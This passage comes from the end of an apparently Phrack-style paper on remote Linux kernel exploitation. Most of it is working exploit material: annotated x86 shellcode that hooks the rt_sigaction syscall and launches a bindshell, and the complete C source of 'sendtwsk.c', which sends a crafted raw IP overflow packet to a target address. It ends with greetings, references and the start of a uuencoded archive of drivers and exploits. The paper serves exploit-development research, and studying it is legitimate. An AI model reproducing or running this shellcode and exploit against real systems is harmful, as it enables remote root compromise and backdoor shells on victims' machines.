 - scan the stack untill we find the 'start marker' of our stage-2 stub. 
   We put a \xaa byte at the start of it, and it's the only one present in
   the shellcode. The addl $10 is there just to start scanning after the
   'cmp $0xaa, %al', which would otherwise give a false positive for \xaa.

"\x83\xc1\x10"                 //  addl $10, %ecx
"\x41"                         //  inc    %ecx
"\x8a\x01"                     //  mov    (%ecx),%al
"\x3c\xaa"                     //  cmp    $0xaa,%al
"\x75\xf9"                     //  jne    52 <search+0x2a>

 - we have found the start of the shellcode, let's copy it in the 'safe
   place' untill the 'end marker' (\xbb). The 'safe place' here is saved
   inside the %esi register. We haven't shown how we calculated it because
   it directly derives from the shellcode used in the next section (it's
   simply somwhere in the stack space). This code could be optimized by
   saving the 'stage-2' stub size in %ecx and using rep/repnz in
   conjuction with mov instructions. 

"\x41"                         //  inc    %ecx
"\x8a\x01"                     //  mov    (%ecx),%al
"\x88\x06"                     //  mov    %al,(%esi)
"\x46"                         //  inc    %esi
"\x41"                         //  inc    %ecx
"\x80\x39\xbb"                 //  cmpb   $0xbb,(%ecx)
"\x75\xf5"                     //  jne    5a <search+0x32>
 
   [during the develop phase of the exploit we have changed a couple of
    times the 'stage-2' part, that's why we left that kind of copy
    operation, even if it's less elegant :) ]


---[ 3.2.5 - Executing Code in Userspace Context [Gimme Life!] 


Okay, we have a 'safe place', all we need now is a 'safe moment', that is
a process context to execute in. The first 'easy' solution that could come
to your mind could be overwriting the #128 software interrupt [int $0x80],
so that it points to our code. The first process issuing a system call
would thus become our 'victim process-context'.
This approach has, thou, two major drawbacks : 
   
  - we have no way to intercept processes using sysenter to access kernel
    space (what if all were using it ? It would be a pretty odd way to
    fail...) 

  - we can't control which process is 'hooked' and that might be
    'disastrous' if the process is the init one or a critical one,
    since we'll borrow its userspace to execute our shellcode (a bindshell
    or a connect-back is not a short-lasting process).  

We have to go a little more deeper inside the kernel to achieve a good
hooking. Our choice was to use the syscall table and to redirect a system
call which has an high degree of possibility to be called and that we're
almost sure that isn't used inside init or any critical process. 
Our choice, after a couple of tests, was to hook the rt_sigaction syscall,
but it's not the only one. It just worked pretty well for us. 

To locate correctly in memory the syscall table we use the stub of code
that sd and devik presented in their phrack paper [23] about /dev/kmem 
patching: 

 - we get the current stack address, calculate the start of the
   thread_struct and we add 0x1000 (pad gap) [simbolic value far enough
   from both the end of the thread_struct and the top of stack]. Here is
   where we set that %esi value that we have presented as 'magically
   already there' in the shellcode-part discussed before.

"\x89\xe6"                     //  mov    %esp,%esi
"\x81\xe6\x00\xe0\xff\xff"     //  and    $0xffffe000,%esi
"\x81\xc6\x00\x10\x00\x00"     //  add    $0x1000,%esi

 - sd & devik sligthly re-adapted code.
 

"\x0f\x01\x0e"                 //  sidtl  (%esi)
"\x8b\x7e\x02"                 //  mov    0x2(%esi),%edi
"\x81\xc7\x00\x04\x00\x00"     //  add    $0x400,%edi
"\x66\x8b\x5f\x06"             //  mov    0x6(%edi),%bx
"\xc1\xe3\x10"                 //  shl    $0x10,%ebx
"\x66\x8b\x1f"                 //  mov    (%edi),%bx
"\x43"                         //  inc    %ebx
"\x8a\x03"                     //  mov    (%ebx),%al
"\x3c\xff"                     //  cmp    $0xff,%al
"\x75\xf9"                     //  jne    28 <search>
"\x8a\x43\x01"                 //  mov    0x1(%ebx),%al
"\x3c\x14"                     //  cmp    $0x14,%al
"\x75\xf2"                     //  jne    28 <search>
"\x8a\x43\x02"                 //  mov    0x2(%ebx),%al
"\x3c\x85"                     //  cmp    $0x85,%al
"\x75\xeb"                     //  jne    28 <search>
"\x8b\x5b\x03"                 //  mov    0x3(%ebx),%ebx 


- logically we need to save the original address of the syscall somewhere,
  and we decided to put it just before the 'stage-2' shellcode : 

 "\x81\xc3\xb8\x02\x00\x00"     //  add 0x2b8, %ebx       
 "\x89\x5e\xf8"                 //  movl %ebx, 0xfffffff8(%esi) 
 "\x8b\x13"                     //  mov    (%ebx),%edx
 "\x89\x56\xfc"                 //  mov    %edx,0xfffffffc(%esi)
 "\x89\x33"                     //  mov    %esi,(%ebx)

As you see, we save the address of the rt_sigaction entry [offset 0x2b8]
inside syscall table (we will need it at restore time, so that we won't
have to calculate it again) and the original address of the function
itself (the above counterpart in the restoring phase). We make point the
rt_sigaction entry to our shellcode : %esi. Now it should be even clearer
why, in the previous section, we had ''magically'' the destination address
to copy our stub into in %esi.    

The first process issuing a rt_sigaction call will just give life to the
stage-2 shellcode, which is the final step before getting the connect-back
or the bindshell executed. [or whatever shellcode you like more ;) ]
We're still in kerneland, while our final goal is to execute an userland
shellcode, so we still have to perform a bounch of operations. 

There are basically two methods (not the only two, but probably the easier
and most effective ones) to achieve our goal : 

  - find saved EIP, temporary disable WP control register flag, copy
    the userland shellcode overthere and re-enable WP flag [it could be 
    potentially dangerous on SMP]. If the syscall is called through
    sysenter, the saved EIP points into vsyscall table, so we must 'scan'
    the stack 'untill ret' (not much different from what we do in the
    stack frame recovery step, just easier here), to get the real
    userspace saved EIP after vsyscall 'return' : 

    0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp
    0xffffe411 <__kernel_vsyscall+17>:      pop    %edx
    0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx
    0xffffe413 <__kernel_vsyscall+19>:      ret

    As you can see, the first executed userspace address (writable) is at
    saved *(ESP + 12).

  - find saved ESP or use syscall saved parameters pointing to an userspace
    buffer, copy the shellcode in that memory location and overwrite the
    saved EIP with saved ESP (or userland buffer address)

The second method is preferable (easier and safer), but if we're dealing
with an architecture supporting the NX-bit or with a software patch that
emulates the execute bit (to mark the stack and eventually the heap as
non-executable), we have to fallback to the first, more intrusive, method,
or our userland process will just segfault while attempting to execute the
shellcode. Since we do have full control of the process-related kernel 
data we can also copy the shellcode in a given place and modify page
protection. [not different from the idea proposed above for IDT read-only 
in the 'Copy the Stub' section]

Once again, let's go on with the dirty details : 

 - the usual call/pop trick to get the address we're executing from 

"\xe8\x00\x00\x00\x00"         //  call   8 <func+0x8>
"\x59"                         //  pop    %ecx
 
 - patch back the syscall table with the original rt_sigaction address
   [if those 0xff8 and 0xffc have no meaning for you, just remember that we 
    added 0x1000 to the thread_struct stack address to calculate our 'safe
    place' and that we stored just before both the syscall table entry 
    address of rt_sigaction and the function address itself]

"\x81\xe1\x00\xe0\xff\xff"     //  and    $0xffffe000,%ecx
"\x8b\x99\xf8\x0f\x00\x00"     //  mov    0xff8(%ecx),%ebx
"\x8b\x81\xfc\x0f\x00\x00"     //  mov    0xffc(%ecx),%eax
"\x89\x03"                     //  mov    %eax,(%ebx)

 - locate Userland ESP and overwrite Userland EIP with it [method 2] 

"\x8b\x74\x24\x38"             //  mov    0x38(%esp),%esi
"\x89\x74\x24\x2c"             //  mov    %esi,0x2c(%esp)
"\x31\xc0"                     //  xor    %eax,%eax

 - once again we use a marker (\x22) to locate the shellcode we want to
   copy on process stack. Let's call it 'stage-3' shellcode. 
   We use just another simple trick here to locate the marker and avoid a
   false positive : instead of jumping after (as we did for the \xaa one)
   we set the '(marker value) - 1' in %al and then increment it. 
   The copy is exactly the same (with the same 'note') we saw before 

"\xb0\x21"                     //  mov    $0x21,%al
"\x40"                         //  inc    %eax
"\x41"                         //  inc    %ecx
"\x38\x01"                     //  cmp    %al,(%ecx)
"\x75\xfb"                     //  jne    2a <func+0x2a>
"\x41"                         //  inc    %ecx
"\x8a\x19"                     //  mov    (%ecx),%bl
"\x88\x1e"                     //  mov    %bl,(%esi)
"\x41"                         //  inc    %ecx
"\x46"                         //  inc    %esi
"\x38\x01"                     //  cmp    %al,(%ecx)
"\x75\xf6"                     //  jne    30 <func+0x30>

 - return from the syscall and let the process cleanly exit to userspace.
   Control will be transfered to our modified EIP and shellcode will be
   executed

"\xc3"                         //  ret


We have used a 'fixed' value to locate userland ESP/EIP, which worked well
for the 'standard' kernels/apps we tested it on (getting to the syscall via 
int $0x80). With a little more effort (worth the time) you can avoid those
offset assumptions by implementing a code similar to the one for the Stack
Frame Recovery tecnique. 
Just take a look to how current userland EIP,ESP,CS and SS are saved
before jumping at kernel level :

ring0 stack:
+--------+
| SS     |  
| ESP    |  <--- saved ESP
| EFLAG  |
| CS     |  
| EIP    |  <--- saved EIP
|......  |
+--------+

All 'unpatched' kernels will have the same value for SS and CS and we can
use it as a fingerprint to locate ESP and EIP (that we can test to be
below PAGE_OFFSET [*]) 

[*] As we already said, on latest kernels there could be a different
    uspace/kspace split address than 0xc0000000 [2G/2G or 1G/3G 
    configurations]

We won't show here the 'stage-3' shellcode since it is a standard
'userland' bindshell one. Just use the one you need depending on the
environment. 


---[ 3.2.6 - The Code : sendtwsk.c


< stuff/expl/sendtwsk.c > 

#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

/* from vuln module */
#define MAX_TWSKCHUNK 30
/* end */

#define NOP 0x90

#define OVERFLOW_NEED   20

#define JMP           "\xe9\x07\xfe\xff\xff"
#define SIZE_JMP      (sizeof(JMP) -1)

#define TWSK_PACKET_LEN (((MAX_TWSKCHUNK * sizeof(struct twsk_chunk)) +
OVERFLOW_NEED) + SIZE_JMP \
                         + sizeof(struct twsk) + sizeof(struct iphdr))

#define TWSK_PROTO 37


#define DEFAULT_VSYSCALL_RET 0xffffe413
#define DEFAULT_VSYSCALL_JMP 0xc01403c0

/*
 *  find the correct value..
alpha:/usr/src/linux/debug/article/remote/figaro/ip_figaro# ./roll
val: 2147483680, 80000020 result: 512
val: 2147483681, 80000021 result: 528
*/

#define NEGATIVE_CHUNK_NUM 0x80000020

char shellcode[]=
/* hook sys_rtsigaction() and copy the 2level shellcode (72) */

 "\x90\x90"                     //  nop; nop; [alignment]
 "\x89\xe6"                     //  mov    %esp,%esi
 "\x81\xe6\x00\xe0\xff\xff"     //  and    $0xffffe000,%esi
 "\x81\xc6\x00\x10\x00\x00"     //  add    $0x1000,%esi
 "\x0f\x01\x0e"                 //  sidtl  (%esi)
 "\x8b\x7e\x02"                 //  mov    0x2(%esi),%edi
 "\x81\xc7\x00\x04\x00\x00"     //  add    $0x400,%edi
 "\x66\x8b\x5f\x06"             //  mov    0x6(%edi),%bx
 "\xc1\xe3\x10"                 //  shl    $0x10,%ebx
 "\x66\x8b\x1f"                 //  mov    (%edi),%bx
 "\x43"                         //  inc    %ebx
 "\x8a\x03"                     //  mov    (%ebx),%al
 "\x3c\xff"                     //  cmp    $0xff,%al
 "\x75\xf9"                     //  jne    28 <search>
 "\x8a\x43\x01"                 //  mov    0x1(%ebx),%al
 "\x3c\x14"                     //  cmp    $0x14,%al
 "\x75\xf2"                     //  jne    28 <search>
 "\x8a\x43\x02"                 //  mov    0x2(%ebx),%al
 "\x3c\x85"                     //  cmp    $0x85,%al
 "\x75\xeb"                     //  jne    28 <search>
 "\x8b\x5b\x03"                 //  mov    0x3(%ebx),%ebx [get
sys_call_table]

 "\x81\xc3\xb8\x02\x00\x00"     //  add 0x2b8, %ebx       [get
sys_rt_sigaction offset]
 "\x89\x5e\xf8"                 //  movl %ebx, 0xfffffff8(%esi) [save
sys_rt_sigaction]

 "\x8b\x13"                     //  mov    (%ebx),%edx
 "\x89\x56\xfc"                 //  mov    %edx,0xfffffffc(%esi)
 "\x89\x33"                     //  mov    %esi,(%ebx)    [make
sys_rt_sigaction point to our shellcode]

 "\xe8\x00\x00\x00\x00"         //  call   51 <search+0x29>
 "\x59"                         //  pop    %ecx
 "\x83\xc1\x10"                 //  addl $10, %ecx
 "\x41"                         //  inc    %ecx
 "\x8a\x01"                     //  mov    (%ecx),%al
 "\x3c\xaa"                     //  cmp    $0xaa,%al
 "\x75\xf9"                     //  jne    52 <search+0x2a>
 "\x41"                         //  inc    %ecx
 "\x8a\x01"                     //  mov    (%ecx),%al
 "\x88\x06"                     //  mov    %al,(%esi)
 "\x46"                         //  inc    %esi
 "\x41"                         //  inc    %ecx
 "\x80\x39\xbb"                 //  cmpb   $0xbb,(%ecx)
 "\x75\xf5"                     //  jne    5a <search+0x32>

/* find and decrement preempt counter (32) */

 "\x89\xe0"                     //  mov %esp,%eax
 "\x25\x00\xe0\xff\xff"         //  and $0xffffe000,%eax
 "\x83\xc0\x04"                 //  add $0x4,%eax
 "\x8b\x18"                     //  mov (%eax),%ebx
 "\x83\xfb\xff"                 //  cmp $0xffffffff,%ebx
 "\x74\x0a"                     //  je 804851e <end>
 "\x81\xfb\x00\x00\x00\xc0"     //  cmp $0xc0000000,%ebx
 "\x74\x02"                     //  je 804851e <end>
 "\xeb\xec"                     //  jmp 804850a <scan>
 "\xff\x48\xfc"                 //  decl 0xfffffffc(%eax)

/* stack frame recovery step */

 "\x58"                         //  pop    %eax
 "\x83\x3c\x24\x02"             //  cmpl   $0x2,(%esp)
 "\x75\xf9"                     //  jne    8048330 <do_unroll>
 "\x83\x7c\x24\x04\x01"         //  cmpl   $0x1,0x4(%esp)
 "\x75\xf2"                     //  jne    8048330 <do_unroll>
 "\x83\x7c\x24\x10\x00"         //  cmpl   $0x0,0x10(%esp)
 "\x75\xeb"                     //  jne    8048330 <do_unroll>
 "\x8d\x64\x24\xfc"             //  lea    0xfffffffc(%esp),%esp

 "\x8b\x04\x24"                 //  mov    (%esp),%eax
 "\x89\xc3"                     //  mov    %eax,%ebx
 "\x03\x43\xfc"                 //  add    0xfffffffc(%ebx),%eax
 "\x40"                         //  inc    %eax
 "\x8a\x18"                     //  mov    (%eax),%bl
 "\x80\xfb\xc3"                 //  cmp    $0xc3,%bl
 "\x75\xf8"                     //  jne    8048351 <do_unroll+0x21>
 "\x80\x78\xff\x88"             //  cmpb   $0x88,0xffffffff(%eax)
 "\x74\xf2"                     //  je     8048351 <do_unroll+0x21>
 "\x80\x78\xff\x89"             //  cmpb   $0x89,0xffffffff(%eax)
 "\x74\xec"                     //  je     8048351 <do_unroll+0x21>
 "\x31\xc9"                     //  xor    %ecx,%ecx
 "\x48"                         //  dec    %eax
 "\x8a\x18"                     //  mov    (%eax),%bl
 "\x80\xe3\xf0"                 //  and    $0xf0,%bl
 "\x80\xfb\x50"                 //  cmp    $0x50,%bl
 "\x75\x03"                     //  jne    8048375 <do_unroll+0x45>
 "\x41"                         //  inc    %ecx
 "\xeb\xf2"                     //  jmp    8048367 <do_unroll+0x37>
 "\x40"                         //  inc    %eax
 "\x89\xc6"                     //  mov    %eax,%esi
 "\x31\xc0"                     //  xor    %eax,%eax
 "\xb0\x04"                     //  mov    $0x4,%al
 "\xf7\xe1"                     //  mul    %ecx
 "\x29\xc4"                     //  sub    %eax,%esp
 "\x31\xc0"                     //  xor    %eax,%eax
 "\xff\xe6"                     //  jmp    *%esi

/* end of stack frame recovery */

/* stage-2 shellcode */

 "\xaa"                         //  border stage-2 start

 "\xe8\x00\x00\x00\x00"         //  call   8 <func+0x8>
 "\x59"                         //  pop    %ecx
 "\x81\xe1\x00\xe0\xff\xff"     //  and    $0xffffe000,%ecx
 "\x8b\x99\xf8\x0f\x00\x00"     //  mov    0xff8(%ecx),%ebx
 "\x8b\x81\xfc\x0f\x00\x00"     //  mov    0xffc(%ecx),%eax
 "\x89\x03"                     //  mov    %eax,(%ebx)
 "\x8b\x74\x24\x38"             //  mov    0x38(%esp),%esi
 "\x89\x74\x24\x2c"             //  mov    %esi,0x2c(%esp)
 "\x31\xc0"                     //  xor    %eax,%eax
 "\xb0\x21"                     //  mov    $0x21,%al
 "\x40"                         //  inc    %eax
 "\x41"                         //  inc    %ecx
 "\x38\x01"                     //  cmp    %al,(%ecx)
 "\x75\xfb"                     //  jne    2a <func+0x2a>
 "\x41"                         //  inc    %ecx
 "\x8a\x19"                     //  mov    (%ecx),%bl
 "\x88\x1e"                     //  mov    %bl,(%esi)
 "\x41"                         //  inc    %ecx
 "\x46"                         //  inc    %esi
 "\x38\x01"                     //  cmp    %al,(%ecx)
 "\x75\xf6"                     //  jne    30 <func+0x30>
 "\xc3"                         //  ret

 "\x22"                         //  border stage-3 start

 "\x31\xdb"                     //  xor    ebx, ebx
 "\xf7\xe3"                     //  mul    ebx
 "\xb0\x66"                     //  mov     al, 102
 "\x53"                         //  push    ebx
 "\x43"                         //  inc     ebx
 "\x53"                         //  push    ebx
 "\x43"                         //  inc     ebx
 "\x53"                         //  push    ebx
 "\x89\xe1"                     //  mov     ecx, esp
 "\x4b"                         //  dec     ebx
 "\xcd\x80"                     //  int     80h
 "\x89\xc7"                     //  mov     edi, eax
 "\x52"                         //  push    edx
 "\x66\x68\x4e\x20"             //  push    word 8270
 "\x43"                         //  inc     ebx
 "\x66\x53"                     //  push    bx
 "\x89\xe1"                     //  mov     ecx, esp
 "\xb0\xef"                     //  mov    al, 239
 "\xf6\xd0"                     //  not    al
 "\x50"                         //  push    eax
 "\x51"                         //  push    ecx
 "\x57"                         //  push    edi
 "\x89\xe1"                     //  mov     ecx, esp
 "\xb0\x66"                     //  mov     al, 102
 "\xcd\x80"                     //  int     80h
 "\xb0\x66"                     //  mov     al, 102
 "\x43"                         //  inc    ebx
 "\x43"                         //  inc    ebx
 "\xcd\x80"                     //  int     80h
 "\x50"                         //  push    eax
 "\x50"                         //  push    eax
 "\x57"                         //  push    edi
 "\x89\xe1"                     //  mov    ecx, esp
 "\x43"                         //  inc    ebx
 "\xb0\x66"                     //  mov    al, 102
 "\xcd\x80"                     //  int    80h
 "\x89\xd9"                     //  mov    ecx, ebx
 "\x89\xc3"                     //  mov     ebx, eax
 "\xb0\x3f"                     //  mov     al, 63
 "\x49"                         //  dec     ecx
 "\xcd\x80"                     //  int     80h
 "\x41"                         //  inc     ecx
 "\xe2\xf8"                     //  loop    lp
 "\x51"                         //  push    ecx
 "\x68\x6e\x2f\x73\x68"         //  push    dword 68732f6eh
 "\x68\x2f\x2f\x62\x69"         //  push    dword 69622f2fh
 "\x89\xe3"                     //  mov     ebx, esp
 "\x51"                         //  push    ecx
 "\x53"                         //  push    ebx
 "\x89\xe1"                     //  mov    ecx, esp
 "\xb0\xf4"                     //  mov    al, 244
 "\xf6\xd0"                     //  not    al
 "\xcd\x80"                     //  int     80h


 "\x22"                         //  border stage-3 end

 "\xbb";                        //  border stage-2 end

/* end of shellcode */


struct twsk_chunk
{
  int type;
  char buff[12];
};

struct twsk
{
  int chunk_num;
  struct twsk_chunk chunk[0];
};


void fatal_perror(const char *issue)
{
  perror("issue");
  exit(1);
}

void fatal(const char *issue)
{
  perror("issue");
  exit(1);
}

/* packet IP cheksum */
unsigned short csum(unsigned short *buf, int nwords)
{
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return ~sum;
}


void prepare_packet(char *buffer)
{
  unsigned char *ptr = (unsigned char *)buffer;;
  unsigned int i;
  unsigned int left;

  left = TWSK_PACKET_LEN - sizeof(struct twsk) - sizeof(struct iphdr);
  left -= SIZE_JMP;
  left -= sizeof(shellcode)-1;

  ptr += (sizeof(struct twsk)+sizeof(struct iphdr));

  memset(ptr, 0x00, TWSK_PACKET_LEN);
  memcpy(ptr, shellcode, sizeof(shellcode)-1); /* shellcode must be 4
bytes aligned */

  ptr += sizeof(shellcode)-1;

  for(i=1; i < left/4; i++, ptr+=4)
        *((unsigned int *)ptr) = DEFAULT_VSYSCALL_RET;

  *((unsigned int *)ptr) = DEFAULT_VSYSCALL_JMP;
  ptr+=4;

  printf("buffer=%p, ptr=%p\n", buffer, ptr);
  strcpy(ptr, JMP); /* jmp -500 */

}


int main(int argc, char *argv[])
{
        int sock;
        struct sockaddr_in sin;
        int one = 1;
        const int *val = &one;

        printf("shellcode size: %d\n", sizeof(shellcode)-1);

        char *buffer = malloc(TWSK_PACKET_LEN);
        if(!buffer)
          fatal_perror("malloc");

        prepare_packet(buffer);

        struct iphdr *ip = (struct iphdr *) buffer;
        struct twsk *twsk = (struct twsk *) (buffer + sizeof(struct
iphdr));


        if(argc < 2)
        {
          printf("Usage: ./sendtwsk ip");
          exit(-1);
        }


        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0)
                fatal_perror("socket");

        sin.sin_family = AF_INET;
        sin.sin_port = htons(12345);
        sin.sin_addr.s_addr = inet_addr(argv[1]);

        /* ip packet */
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 16;
        ip->tot_len = TWSK_PACKET_LEN;
        ip->id = htons(12345);
        ip->ttl = 64;
        ip->protocol = TWSK_PROTO;
        ip->saddr = inet_addr("192.168.200.1");
        ip->daddr = inet_addr(argv[1]);
        twsk->chunk_num = NEGATIVE_CHUNK_NUM;
        ip->check = csum((unsigned short *) buffer, TWSK_PACKET_LEN);

        if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
          fatal_perror("setsockopt");

        if (sendto(sock, buffer, ip->tot_len, 0, (struct sockaddr *) &sin,
sizeof(sin)) < 0)
          fatal_perror("sendto");

        return 0;
}

< / >

 
------[ 4 - Final words 


With the remote exploiting discussion ends that paper. We have presented
different scenarios and different exploiting tecniques and 'notes' that we
hope you'll find somehow useful. This paper was a sort of sum up of the
more general approaches we took in those years of 'kernel exploiting'. 

As we said at the start of the paper, the kernel is a big and large beast,
which offers many different points of 'attack' and which has more severe
constraints than the userland exploiting. It is also 'relative new' and
improvements (and new logical or not bugs) are getting out. 
At the same time new countermeasures come out to make our 'exploiting
life' harder and harder. 

The first draft of this paper was done some months ago, so we apologies if
some of the information here present could be outdated (or already
presented somewhere else and not properly referenced). We've tried to add
a couple of comments around the text to point out the most important
recent changes.  

So, this is the end, time remains just for some greets. Thank you for
reading so far, we hope you enjoyed the whole work. 

A last minute shotout goes to bitsec guys, who performed a cool talk 
about kernel exploiting at BlackHat conference [24]. Go check their
paper/exploits for examples and covering of *BSD and Windows systems.

Greetz and thanks go, in random order, to :  

sgrakkyu: darklady(:*), HTB, risk (Arxlab), recidjvo (for netfilter
tricks), vecna (for being vecna:)).

twiz: lmbdwr, ga, sd, karl, cmn, christer, koba, smaster, #dnerds & 
#elfdev people for discussions, corrections, feedbacks and just long
'evening/late night' talks.
A last shotout to akira, sanka, metal_militia and yhly for making the
monday evening a _great_ evening [and for all the beers offered :-) ]. 


------[ 5 - References


[1] - Intel Architecture Reference Manuals
      http://www.intel.com/products/processor/manuals/index.htm

[2] - SPARC V9 Architecture 
      http://www.sparc.com/standards/SPARCV9.pdf

[3] - AMD64 Reference Manuals
      http://www.amd.com/it-it/Processors/
      ProductInformation/0,,30_118_4699_875^7044,00.html

[4] - MCAST_MSFILTER iSEC's advisory  
      http://www.isec.pl/vulnerabilities/isec-0015-msfilter.txt

[5] - sendmsg local buffer overflow
      http://www.securityfocus.com/bid/14785

[6] - kad, "Handling Interrupt Descriptor Table for fun and profit"
      http://www.phrack.org/archives/59/p59-0x04.txt 

[7] - iSEC Security Research
      http://www.isec.pl

[8] - Jeff Bonwick, "The Slab Allocator: An Object-Caching Kernel Memory
      Allocator"
      http://www.usenix.org/publications/library/proceedings/
      bos94/bonwick.html

[9] - Daniel P. Bovet & Marco Cesati
      "Understanding the Linux Kernel", 3rd Edition [ISBN 0-596-00565-2]

[10] - Richard McDougall and Jim Mauro
       "Solaris Internals" , 2nd Edition [ISBN 0-13-148209-2]

[11] - Mel Gorman, "Linux VM Documentation" 
       http://www.skynet.ie/~mel/projects/vm/

[12] - sd, krad exploit for sys_epoll vulnerability
       http://www.securiteam.com/exploits/5VP0N0UF5U.html

[13] - noir, "Smashing The Kernel Stack For Fun And Profit" 
       http://www.phrack.org/archives/60/p60-0x06.txt

[14] - UltraSPARC User's Manuals 
       http://www.sun.com/processors/documentation.html

[15] - pr1, "Exploiting SPARC Buffer Overflow vulnerabilities"
       http://www.emsi.it.pl/sploits/solaris/sparcoverflow.html

[16] - horizon, Defeating Solaris/SPARC Non-Executable Stack Protection
       http://www.emsi.it.pl/sploits/solaris/horizon.html

[17] - Gavin Maltby's Sun Weblog, "SPARC System Calls" 
       http://blogs.sun.com/gavinm/entry/sparc_system_calls

[18] - PaX project 
       http://pax.grsecurity.net 	    

[19] - Solar Designer, "Getting around non-executable stack (and fix)" 
       http://insecure.org/sploits/linux.libc.return.lpr.sploit.html

[20] - Sebastian Krahmer, "x86-64 buffer overflow exploits and the
       borrowed code chunks exploitation technique"
       http://www.suse.de/~krahmer/no-nx.pdf 

[21] - Laurent BUTTI, Jerome RAZNIEWSKI & Julien TINNES
       "Madwifi SIOCGIWSCAN buffer overflow"
       http://lists.grok.org.uk/pipermail/full-disclosure/2006-December
       /051176.html

[22] - sgrakkyu, "madwifi linux remote kernel exploit"
       http://www.milw0rm.com/exploits/3389

[23] - sd & devik, "Linux on-the-fly kernel patching without LKM" 
       http://www.phrack.org/archives/58/p58-0x07

[24] - Joel Eriksson, Karl Janmar & Christer Öberg, "Kernel Wars"
       https://www.blackhat.com/presentations/bh-eu-07/Eriksson-Janmar
       /Whitepaper/bh-eu-07-eriksson-WP.pdf


------[ 6 - Sources - drivers and exploits [stuff.tgz]


begin 644 stuff.tgz
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
